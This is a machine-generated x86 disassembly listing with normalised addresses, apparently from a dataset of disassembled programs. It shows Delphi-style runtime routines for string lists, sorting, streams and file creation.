push sub_418841
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov edi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
test edi edi
jl r-xdata
test edi edi
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418848
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404e68
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push [ ebp - 0x4 ]
mov eax esi
call sub_418bb0
mov edx eax
lea eax [ ebp - 0x10 ]
call sub_40502c
push [ ebp - 0x10 ]
push [ ebp - 0x8 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_4051e4
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edi eax
sub_418850
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4188c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_41d064
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_41d06c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4188cd
lea eax [ ebp - 0xc ]
call sub_404e44
retn
inc ebx
xor esi esi
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d120
inc esi
dec ebx
jne r-xdata
sub_4188d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
lea edi [ ebp - 0xc ]
xor eax eax
push ebp
push sub_418a62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417a34
xor eax eax
push ebp
push sub_418a45
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax ebx
call sub_405324
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
call sub_418ad4
test al al
jne r-xdata
mov eax [ edi ]
movzx ebx [ eax ]
test bl bl
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_418abc
cmp bl al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a4c
mov eax [ ebp - 0x8 ]
call sub_417af0
retn
mov eax [ edi ]
movzx eax [ eax ]
dec eax
sub al 0x20
jb r-xdata
mov esi [ edi ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_418abc
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax edi
call sub_4094ec
jmp r-xdata
mov eax [ edi ]
push eax
call CharNextA
mov [ edi ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xe ] 0x0
je r-xdata
mov eax [ edi ]
cmp [ eax ] 0x20
ja r-xdata
mov eax [ ebp - 0x8 ]
call sub_418a70
mov edx [ edi ]
cmp al [ edx ]
jne r-xdata
jmp r-xdata
mov ecx [ edi ]
sub ecx esi
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404f34
mov eax [ edi ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_418a70
mov edx [ edi ]
cmp al [ edx ]
jne r-xdata
mov esi [ edi ]
push esi
call CharNextA
cmp [ eax ] 0x0
jne r-xdata
mov eax [ edi ]
movzx eax [ eax ]
dec eax
sub al 0x20
jb r-xdata
mov eax [ edi ]
push eax
call CharNextA
mov [ edi ] eax
mov eax [ edi ]
push eax
call CharNextA
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ edi ]
push eax
call CharNextA
mov [ edi ] eax
mov eax [ edi ]
movzx eax [ eax ]
dec eax
sub al 0x20
jb r-xdata
sub_418a88
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x4 ] 0x8
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404e98
pop esi
pop ebx
retn
mov edx r-xdata
mov eax ebx
call sub_418b08
sub_418aec
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x5 ]
jne r-xdata
or [ esi + 0x4 ] 0x1
mov [ esi + 0x5 ] bl
test [ esi + 0x4 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
sub_418b08
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_405270
jne r-xdata
or [ ebx + 0x4 ] 0x8
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404e98
test [ ebx + 0x4 ] 0x8
jne r-xdata
pop esi
pop ebx
retn
sub_418b34
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc ]
jne r-xdata
or [ esi + 0x4 ] 0x2
mov [ esi + 0xc ] bl
test [ esi + 0x4 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
sub_418b50
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xe ]
jne r-xdata
or [ esi + 0x4 ] 0x10
mov [ esi + 0xe ] bl
test [ esi + 0x4 ] 0x10
jne r-xdata
pop esi
pop ebx
retn
sub_418b6c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx edi
test ebx ebx
je r-xdata
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax ebp
call sub_405324
push eax
push ebx
mov eax edi
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop ebp
pop edi
pop esi
pop ebx
retn
sub esi 0x4
mov esi [ esi ]
sub_418bc8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xd ]
jne r-xdata
or [ esi + 0x4 ] 0x4
mov [ esi + 0xd ] bl
test [ esi + 0x4 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
sub_418be4
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41784c
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x1c ] eax
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
test bl bl
jle r-xdata
mov ecx eax
mov eax [ esi + 0x18 ]
mov edx [ r-xdata ]
call sub_405af0
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_418c50
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x8c ]
test al al
je r-xdata
mov eax [ ebx + 0x1c ]
mov [ esp ] eax
jmp r-xdata
push edi
mov ecx esi
mov edx [ esp + 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
movzx eax [ ebx + 0x25 ]
sub al 0x1
jb r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
dec al
je r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_417be8
jmp r-xdata
sub_418cec
push ebx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
mov ecx [ ebx + 0x1c ]
mov edx [ r-xdata ]
call sub_405af0
xor eax eax
mov [ ebx + 0x1c ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_418d2c
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_417be8
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x18 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_402f9c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_405bdc
dec [ ebx + 0x1c ]
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
sub_418d98
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_417be8
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_417be8
cmp edi [ ebx + 0x1c ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_418df4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_418df4
push ebx
mov ebx [ eax + 0x18 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x18 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_418e18
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x1c ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
movzx eax [ esp + 0x8 ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x18 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
mov [ esp + 0x10 ] eax
cmp [ esp + 0x10 ] 0x0
jge r-xdata
mov eax ebx
dec eax
mov [ esp + 0xc ] eax
cmp [ esp + 0x10 ] 0x0
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x25 ] 0x1
je r-xdata
mov esi ebx
sub_418e9c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_417be8
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x18 ]
mov edx [ edx + esi * 8 ]
call sub_404e98
pop edi
pop esi
pop ebx
retn
sub_418ed8
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_417be8
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax [ ebx + 0x18 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_418f00
push esi
mov edx [ eax + 0x20 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_418f34
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_418038
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_418f80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_417be8
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_417be8
cmp esi [ ebx + 0x1c ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_418fd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x20 ]
jne r-xdata
mov eax [ ebx + 0x1c ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_418f00
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_404e98
inc [ ebx + 0x1c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x18 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x18 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
add ecx ecx
mov eax edx
pop edx
call sub_402f9c
sub_419050
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_417be8
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_417be8
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_404e98
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4190ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_417be8
cmp esi [ ebx + 0x1c ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x18 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4190ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418df4
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4190ec
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_419180
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
add edx edx
add edx edx
add edx edx
lea eax [ ebx + 0x18 ]
call sub_402d5c
mov [ ebx + 0x20 ] esi
pop esi
pop ebx
retn
sub_41919c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x24 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x24 ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_4191d4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x18 ]
mov ecx [ eax + ecx * 8 ]
mov eax [ esi + 0x18 ]
mov edx [ eax + edi * 8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop edi
pop esi
pop ebx
retn
sub_419204
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1c ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x1c ]
dec ecx
xor edx edx
mov eax ebx
call sub_4190ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_41923c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
cmp [ eax + 0x26 ] 0x0
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov ebx edi
test ebx ebx
je r-xdata
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov esi ebp
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax ebp
call sub_405324
push eax
push ebx
mov eax edi
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
sub esi 0x4
mov esi [ esi ]
push esi
mov eax ebp
call sub_405324
push eax
push ebx
mov eax edi
call sub_405324
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4192c0
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_4192f4
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_419358
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_4193ac
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_403e44
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dcac
call sub_4047d8
mov esp ebp
pop ebp
retn
sub_4193f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_403e3c
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_4193ac
pop ecx
mov eax [ ebx ]
call sub_403ef0
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
movzx edx [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_4193ac
pop ecx
sub_41947c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
movzx ecx bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_4194ec
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
sub_419524
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
sub_41955c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_4192e0
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_402d28
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_419638
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41963f
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_402d44
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_4194ec
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_419524
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_419650
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419e48
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4196a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_41c03c
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196a7
mov eax [ ebp - 0x8 ]
call sub_403f64
retn
sub_4196b0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_41970c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_409d3c
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_41974c
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40f3d0
pop ebx
pop ebp
retn 0x8
sub_419774
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
movzx eax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_4197b8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4197b8
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_419900
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_404288
movzx edx di
mov eax esi
call sub_409c8c
mov ecx eax
xor edx edx
mov eax ebx
call sub_4196b0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax esi
call sub_405324
push eax
call CreateFileA
mov ecx eax
xor edx edx
mov eax ebx
call sub_4196b0
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419907
lea eax [ ebp - 0x24 ]
